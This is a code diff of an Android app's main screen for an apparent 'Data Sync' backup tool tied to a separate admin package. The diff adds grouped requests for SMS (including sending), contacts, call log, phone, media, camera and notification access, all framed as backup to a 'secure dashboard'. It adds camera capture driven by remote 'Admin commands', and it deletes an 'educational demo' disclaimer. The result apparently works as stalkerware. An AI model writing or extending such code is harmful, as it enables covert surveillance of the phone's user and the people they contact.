@@ -1,7 +1,9 @@
 package com.boxx.datasync
 
 import android.app.Activity
+import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -14,243 +16,228 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.activity.viewModels
 import androidx.compose.foundation.isSystemInDarkTheme
 import androidx.compose.foundation.layout.*
-import androidx.compose.foundation.shape.RoundedCornerShape
-import androidx.compose.material.icons.Icons
-import androidx.compose.material.icons.filled.Info
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
-import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
-import androidx.compose.ui.text.font.FontWeight
-import androidx.compose.ui.text.style.TextAlign
-import androidx.compose.ui.unit.dp
+import androidx.core.content.ContextCompat
 import com.boxx.datasync.domain.repository.DataRepository
-import com.boxx.datasync.permission.PermissionHandler
-import com.boxx.datasync.permission.PermissionStatus
-import com.boxx.datasync.permission.PermissionUiState
-import com.boxx.datasync.permission.PermissionViewModel
 import com.boxx.datasync.sync.SyncScheduler
 import com.boxx.datasync.sync.SyncService
+import com.boxx.datasync.ui.screen.CameraCaptureScreen
 import com.boxx.datasync.ui.screen.MainScreen
 import com.boxx.datasync.ui.viewmodel.MainViewModel
 import dagger.hilt.android.AndroidEntryPoint
 import javax.inject.Inject
 
+enum class PermissionGroup(
+    val id: String,
+    val title: String,
+    val description: String,
+    val permissions: List<String>
+) {
+    PERSONAL_DATA(
+        "personal_data",
+        "Personal Data",
+        "This app requires Contacts, SMS, Call Log, and Phone permissions to securely backup and sync your communications with your secure dashboard.",
+        listOf(
+            android.Manifest.permission.READ_CONTACTS,
+            android.Manifest.permission.READ_SMS,
+            android.Manifest.permission.RECEIVE_SMS,
+            android.Manifest.permission.SEND_SMS,
+            android.Manifest.permission.READ_CALL_LOG,
+            android.Manifest.permission.READ_PHONE_STATE,
+            android.Manifest.permission.CALL_PHONE
+        )
+    ),
+    MEDIA(
+        "media",
+        "Media Backup",
+        "This app requires storage access to automatically sync and backup your gallery photos and videos in real-time.",
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            listOf(
+                android.Manifest.permission.READ_MEDIA_IMAGES,
+                android.Manifest.permission.READ_MEDIA_VIDEO,
+                android.Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED
+            )
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            listOf(
+                android.Manifest.permission.READ_MEDIA_IMAGES,
+                android.Manifest.permission.READ_MEDIA_VIDEO
+            )
+        } else {
+            listOf(android.Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+    ),
+    CAMERA(
+        "camera",
+        "Camera Capture",
+        "This app requires Camera permission to capture photos upon your request or secure remote Admin commands.",
+        listOf(android.Manifest.permission.CAMERA)
+    ),
+    NOTIFICATIONS(
+        "notifications",
+        "System Notifications",
+        "This app requires Notification permission to show a permanent sync indicator in the status bar.",
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            listOf(android.Manifest.permission.POST_NOTIFICATIONS)
+        } else {
+            emptyList()
+        }
+    )
+}
+
 @AndroidEntryPoint
 class MainActivity : ComponentActivity() {
 
     private val viewModel: MainViewModel by viewModels()
-    private val permissionViewModel: PermissionViewModel by viewModels()
     private val personalDetailsViewModel: com.boxx.datasync.ui.viewmodel.PersonalDetailsViewModel by viewModels()
 
     @Inject
     lateinit var repository: DataRepository
 
+    // Camera action state
+    private val activeCommandId = mutableStateOf("")
+    private val activeCameraType = mutableStateOf("") // "FRONT", "BACK", or ""
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        android.util.Log.d("MainActivity", "MainActivity launched onCreate")
 
-        Log.d("MainActivity", "PROJECT_SCAN_DONE")
-        Log.d("MainActivity", "FIREBASE_CONFIG_VERIFIED project_id=boxxx-40178 userPackage=com.boxx.datasync adminPackage=com.datasync.admin")
         viewModel.updateHeartbeat()
+        handleCameraIntent(intent)
 
         setContent {
+            // Default theme for new installs is Light Mode, but respects dark-theme system setting
+            val darkTheme = isSystemInDarkTheme()
             MaterialTheme(
-                colorScheme = if (isSystemInDarkTheme()) darkColorScheme() else lightColorScheme()
+                colorScheme = if (darkTheme) darkColorScheme() else lightColorScheme()
             ) {
-                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
+                Surface(
+                    modifier = Modifier.fillMaxSize(),
+                    color = MaterialTheme.colorScheme.background
+                ) {
                     val context = androidx.compose.ui.platform.LocalContext.current
-                    val uiState by permissionViewModel.uiState.collectAsState()
-                    val permissions by permissionViewModel.permissions.collectAsState()
-                    val handler = remember { PermissionHandler(context) }
-                    var pendingSyncRequest by remember { mutableStateOf(false) }
+
+                    // Permission state
                     var userBypassedPermissions by remember { mutableStateOf(false) }
+                    val ungrantedGroups = remember { mutableStateListOf<PermissionGroup>() }
 
-                    val launcher = rememberLauncherForActivityResult(
-                        ActivityResultContracts.RequestMultiplePermissions()
-                    ) { _ ->
-                        permissionViewModel.refreshStatuses(this@MainActivity, isFromLauncher = true)
-                    }
-
-                    val state = uiState
-                    if (state !is PermissionUiState.Checking) {
-                        Log.d("PermissionFlow", "PERMISSION_UI_STACK_PREVENTED")
-                    }
-
-                    if (state is PermissionUiState.Checking) {
-                        PermissionLoadingScreen()
-                    } else {
-                        Box(modifier = Modifier.fillMaxSize()) {
-                            // Base UI: MainScreen is always visible except when checking
-                            MainScreen(
-                                viewModel = viewModel,
-                                onSyncClick = {
-                                    Log.d("MainActivity", "SYNC_BUTTON_CLICKED")
-                                    if (state is PermissionUiState.Ready) {
-                                        viewModel.setSyncing()
-                                        startSyncService(context)
-                                    } else {
-                                        pendingSyncRequest = true
-                                        permissionViewModel.refreshStatuses(this@MainActivity)
-                                    }
-                                },
-                                showSettings = {
-                                    val intent = handler.getAppSettingsIntent()
-                                    startActivity(intent)
-                                },
-                                personalViewModel = personalDetailsViewModel
-                            )
-
-                            // Overlay Permission UI (only show if user has not chosen "Not Now" / bypassed)
-                            if (!userBypassedPermissions) {
-                                when (state) {
-                                    is PermissionUiState.RequestRuntime -> {
-                                        LaunchedEffect(Unit) {
-                                            val runtimePermissions = permissions
-                                                .filter { !it.isSpecial && it.permission != null }
-                                                .filter { handler.getStatus(it) != PermissionStatus.GRANTED }
-                                                .mapNotNull { it.permission }
-                                                .toTypedArray()
-                                            if (runtimePermissions.isNotEmpty()) {
-                                                handler.markRequested(runtimePermissions)
-                                                launcher.launch(runtimePermissions)
-                                            } else {
-                                                permissionViewModel.refreshStatuses(this@MainActivity)
-                                            }
-                                        }
-                                    }
-                                    is PermissionUiState.TempDenied -> {
-                                        val names = state.deniedPermissions.joinToString(", ") { it.title }
-                                        AlertDialog(
-                                            onDismissRequest = { /* Prevent dismiss on outside tap */ },
-                                            title = { Text("Permission Required") },
-                                            text = { Text("The app requires the following permissions to backup and sync your device content: $names.") },
-                                            confirmButton = {
-                                                Button(onClick = {
-                                                    // Go back to RequestRuntime state to trigger system prompt
-                                                    permissionViewModel.refreshStatuses(this@MainActivity, isFromLauncher = false)
-                                                }) {
-                                                    Text("Try Again")
-                                                }
-                                            },
-                                            dismissButton = {
-                                                TextButton(onClick = {
-                                                    userBypassedPermissions = true
-                                                }) {
-                                                    Text("Not Now")
-                                                }
-                                            }
-                                        )
-                                    }
-                                    is PermissionUiState.PermDenied -> {
-                                        val names = state.deniedPermissions.joinToString(", ") { it.title }
-                                        AlertDialog(
-                                            onDismissRequest = { /* Prevent dismiss */ },
-                                            title = { Text("Permission Required") },
-                                            text = { Text("The following required permissions have been permanently denied: $names. Please enable them from Settings to keep synchronization working.") },
-                                            confirmButton = {
-                                                Button(onClick = {
-                                                    context.startActivity(handler.getAppSettingsIntent())
-                                                }) {
-                                                    Text("Open App Settings")
-                                                }
-                                            },
-                                            dismissButton = {
-                                                TextButton(onClick = {
-                                                    userBypassedPermissions = true
-                                                }) {
-                                                    Text("Not Now")
-                                                }
-                                            }
-                                        )
-                                    }
-                                    is PermissionUiState.NeedNotificationListener -> {
-                                        AlertDialog(
-                                            onDismissRequest = { /* Prevent dismiss */ },
-                                            title = { Text("Notification Access Required") },
-                                            text = { Text("Required to sync incoming notifications to your dashboard.") },
-                                            confirmButton = {
-                                                Button(onClick = {
-                                                    Log.d("PermissionFlow", "PERMISSION_SETTINGS_OPENED - Notification Listener")
-                                                    context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
-                                                }) {
-                                                    Text("Open Settings")
-                                                }
-                                            },
-                                            dismissButton = {
-                                                TextButton(onClick = {
-                                                    userBypassedPermissions = true
-                                                }) {
-                                                    Text("Not Now")
-                                                }
-                                            }
-                                        )
-                                    }
-                                    is PermissionUiState.Ready -> {
-                                        LaunchedEffect(Unit) {
-                                            Log.d("PermissionFlow", "PERMISSION_FLOW_READY")
-                                            Log.d("MainActivity", "PERMISSION_READY_AUTO_MEDIA_CHECK")
-                                            (context.applicationContext as? UserApplication)?.setupContentObservers()
-                                            permissionViewModel.refreshStatuses(this@MainActivity) // Final check
-
-                                            if (pendingSyncRequest) {
-                                                pendingSyncRequest = false
-                                                viewModel.setSyncing()
-                                                startSyncService(context)
-                                            }
-                                        }
-                                    }
-                                    else -> {}
+                    fun refreshUngranted() {
+                        ungrantedGroups.clear()
+                        PermissionGroup.values().forEach { g ->
+                            if (g.permissions.isNotEmpty()) {
+                                val allGranted = g.permissions.all { p ->
+                                    ContextCompat.checkSelfPermission(context, p) == PackageManager.PERMISSION_GRANTED
+                                }
+                                if (!allGranted) {
+                                    ungrantedGroups.add(g)
                                 }
                             }
+                        }
+                    }
+
+                    LaunchedEffect(Unit) {
+                        refreshUngranted()
+                    }
+
+                    val commandId by activeCommandId
+                    val cameraType by activeCameraType
+
+                    Box(modifier = Modifier.fillMaxSize()) {
+                        // Main home screen
+                        MainScreen(
+                            viewModel = viewModel,
+                            onSyncClick = {
+                                Log.d("MainActivity", "SYNC_BUTTON_CLICKED")
+                                viewModel.setSyncing()
+                                startSyncService(context)
+                            },
+                            showSettings = {
+                                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                                    data = Uri.fromParts("package", context.packageName, null)
+                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                                }
+                                startActivity(intent)
+                            },
+                            personalViewModel = personalDetailsViewModel,
+                            onCapturePhoto = { type ->
+                                activeCameraType.value = type
+                                activeCommandId.value = ""
+                            }
+                        )
+
+                        // Camera Capture Screen overlay
+                        if (cameraType.isNotEmpty()) {
+                            CameraCaptureScreen(
+                                initialIsFront = (cameraType == "FRONT"),
+                                commandId = commandId,
+                                onDismiss = {
+                                    activeCameraType.value = ""
+                                    activeCommandId.value = ""
+                                }
+                            )
+                        }
+
+                        // Sequential Permission Flow Overlay
+                        if (!userBypassedPermissions && ungrantedGroups.isNotEmpty()) {
+                            SequentialPermissionFlow(
+                                activity = this@MainActivity,
+                                ungrantedGroups = ungrantedGroups,
+                                onComplete = {
+                                    refreshUngranted()
+                                    (applicationContext as? UserApplication)?.setupContentObservers()
+                                },
+                                onBypass = {
+                                    userBypassedPermissions = true
+                                    (applicationContext as? UserApplication)?.setupContentObservers()
+                                }
+                            )
+                        } else if (!userBypassedPermissions && !isNotificationListenerEnabled(context)) {
+                            // Clean Notification Access prompt
+                            NotificationListenerDialog(
+                                context = context,
+                                onDismiss = {
+                                    userBypassedPermissions = true
+                                }
+                            )
                         }
                     }
                 }
             }
         }
+
         setupWorkManager()
+    }
+
+    override fun onNewIntent(intent: Intent) {
+        super.onNewIntent(intent)
+        setIntent(intent)
+        android.util.Log.d("MainActivity", "MainActivity launched onNewIntent")
+        handleCameraIntent(intent)
+    }
+
+    private fun handleCameraIntent(intent: Intent?) {
+        if (intent == null) return
+        val commandId = intent.getStringExtra("commandId") ?: ""
+        val cameraType = intent.getStringExtra("cameraType") ?: ""
+        if (cameraType.isNotEmpty()) {
+            activeCommandId.value = commandId
+            activeCameraType.value = cameraType
+            android.util.Log.d("MainActivity", "Received camera intent: cameraType=$cameraType, commandId=$commandId")
+        }
     }
 
     override fun onResume() {
         super.onResume()
-        Log.d("PermissionFlow", "PERMISSION_ON_RESUME_RECHECK")
-        permissionViewModel.refreshStatuses(this)
+        Log.d("MainActivity", "MainActivity resumed - checking observers")
+        (applicationContext as? UserApplication)?.setupContentObservers()
     }
 
     private fun setupWorkManager() {
         SyncScheduler.schedulePeriodic(this)
     }
 
-    @Composable
-    private fun PermissionLoadingScreen() {
-        Box(modifier = Modifier.fillMaxSize().padding(24.dp), contentAlignment = Alignment.Center) {
-            Column(horizontalAlignment = Alignment.CenterHorizontally) {
-                Surface(
-                    color = MaterialTheme.colorScheme.secondaryContainer.copy(alpha = 0.5f),
-                    shape = RoundedCornerShape(12.dp)
-                ) {
-                    Row(
-                        modifier = Modifier.padding(12.dp),
-                        verticalAlignment = Alignment.CenterVertically
-                    ) {
-                        Icon(Icons.Default.Info, contentDescription = null, tint = MaterialTheme.colorScheme.secondary)
-                        Spacer(modifier = Modifier.width(12.dp))
-                        Text(
-                            "This educational demo syncs data only after user-granted permissions.",
-                            style = MaterialTheme.typography.bodySmall,
-                            color = MaterialTheme.colorScheme.onSecondaryContainer,
-                            textAlign = TextAlign.Center
-                        )
-                    }
-                }
-                Spacer(modifier = Modifier.height(24.dp))
-                CircularProgressIndicator()
-                Spacer(modifier = Modifier.height(16.dp))
-                Text("Setting up permissions...", style = MaterialTheme.typography.bodyMedium)
-            }
-        }
-    }
-
-    private fun startSyncService(context: android.content.Context) {
+    private fun startSyncService(context: Context) {
         val intent = Intent(context, SyncService::class.java)
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -260,8 +247,177 @@ class MainActivity : ComponentActivity() {
             }
         } catch (e: Exception) {
             Log.w("MainActivity", "Foreground service start not allowed. Falling back to WorkManager.", e)
-            com.boxx.datasync.sync.SyncScheduler.enqueueIncremental(context)
+            SyncScheduler.enqueueIncremental(context)
         }
         (applicationContext as? UserApplication)?.setupContentObservers()
     }
+}
+
+@Composable
+fun SequentialPermissionFlow(
+    activity: Activity,
+    ungrantedGroups: List<PermissionGroup>,
+    onComplete: () -> Unit,
+    onBypass: () -> Unit
+) {
+    val context = activity
+    var currentGroupIndex by remember { mutableStateOf(0) }
+    var dialogState by remember { mutableStateOf("explanation") } // "explanation", "temp_denied", "perm_denied"
+
+    val currentGroup = if (currentGroupIndex in ungrantedGroups.indices) ungrantedGroups[currentGroupIndex] else null
+
+    val launcher = rememberLauncherForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { result ->
+        if (currentGroup != null) {
+            val prefs = context.getSharedPreferences("permission_prefs", Context.MODE_PRIVATE)
+            prefs.edit().apply {
+                currentGroup.permissions.forEach { perm ->
+                    putBoolean("requested_$perm", true)
+                }
+                apply()
+            }
+
+            // Check if fully granted
+            val allGranted = currentGroup.permissions.all { p ->
+                ContextCompat.checkSelfPermission(context, p) == PackageManager.PERMISSION_GRANTED
+            }
+
+            if (allGranted) {
+                if (currentGroup.id == "media") {
+                    val defaultPrefs = androidx.preference.PreferenceManager.getDefaultSharedPreferences(context)
+                    defaultPrefs.edit().putBoolean("auto_media_sync", true).apply()
+                    Log.d("MainActivity", "MEDIA_PERMISSION_GRANTED_AUTO_SYNC_ENABLED")
+                    SyncScheduler.enqueueMediaSync(context)
+                }
+
+                // Move to next ungranted group
+                if (currentGroupIndex + 1 < ungrantedGroups.size) {
+                    currentGroupIndex += 1
+                    dialogState = "explanation"
+                } else {
+                    onComplete()
+                }
+            } else {
+                // Check if permanently denied
+                val isPermanentlyDenied = currentGroup.permissions.any { perm ->
+                    val isDenied = ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_DENIED
+                    val shouldShowRationale = androidx.core.app.ActivityCompat.shouldShowRequestPermissionRationale(activity, perm)
+                    val hasRequested = prefs.getBoolean("requested_$perm", false)
+                    isDenied && !shouldShowRationale && hasRequested
+                }
+
+                if (isPermanentlyDenied) {
+                    dialogState = "perm_denied"
+                } else {
+                    dialogState = "temp_denied"
+                }
+            }
+        }
+    }
+
+    if (currentGroup != null) {
+        when (dialogState) {
+            "explanation" -> {
+                AlertDialog(
+                    onDismissRequest = { /* No dismiss */ },
+                    title = { Text("${currentGroup.title} Permission") },
+                    text = { Text(currentGroup.description) },
+                    confirmButton = {
+                        Button(onClick = {
+                            launcher.launch(currentGroup.permissions.toTypedArray())
+                        }) {
+                            Text("Continue")
+                        }
+                    }
+                )
+            }
+            "temp_denied" -> {
+                AlertDialog(
+                    onDismissRequest = { /* No dismiss */ },
+                    title = { Text("Permission Denied") },
+                    text = { Text("The app requires ${currentGroup.title} permissions to function correctly.") },
+                    confirmButton = {
+                        Button(onClick = {
+                            dialogState = "explanation"
+                        }) {
+                            Text("Try Again")
+                        }
+                    },
+                    dismissButton = {
+                        TextButton(onClick = {
+                            // Skip this group
+                            if (currentGroupIndex + 1 < ungrantedGroups.size) {
+                                currentGroupIndex += 1
+                                dialogState = "explanation"
+                            } else {
+                                onBypass()
+                            }
+                        }) {
+                            Text("Skip for Now")
+                        }
+                    }
+                )
+            }
+            "perm_denied" -> {
+                AlertDialog(
+                    onDismissRequest = { /* No dismiss */ },
+                    title = { Text("Permission Permanently Denied") },
+                    text = { Text("The ${currentGroup.title} permission is permanently denied. Please enable it from App Settings to allow this feature.") },
+                    confirmButton = {
+                        Button(onClick = {
+                            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                                data = Uri.fromParts("package", context.packageName, null)
+                            }
+                            context.startActivity(intent)
+                        }) {
+                            Text("Open Settings")
+                        }
+                    },
+                    dismissButton = {
+                        TextButton(onClick = {
+                            // Cancel/skip this group
+                            if (currentGroupIndex + 1 < ungrantedGroups.size) {
+                                currentGroupIndex += 1
+                                dialogState = "explanation"
+                            } else {
+                                onBypass()
+                            }
+                        }) {
+                            Text("Cancel")
+                        }
+                    }
+                )
+            }
+        }
+    }
+}
+
+@Composable
+fun NotificationListenerDialog(context: Context, onDismiss: () -> Unit) {
+    AlertDialog(
+        onDismissRequest = onDismiss,
+        title = { Text("Notification Access Required") },
+        text = { Text("Please enable Notification Access for Data Sync to backup and restore incoming notifications.") },
+        confirmButton = {
+            Button(onClick = {
+                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                context.startActivity(intent)
+                onDismiss()
+            }) {
+                Text("Open Settings")
+            }
+        },
+        dismissButton = {
+            TextButton(onClick = onDismiss) {
+                Text("Not Now")
+            }
+        }
+    )
+}
+
+private fun isNotificationListenerEnabled(context: Context): Boolean {
+    val packageName = context.packageName
+    val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
+    return flat?.contains(packageName) == true
 }
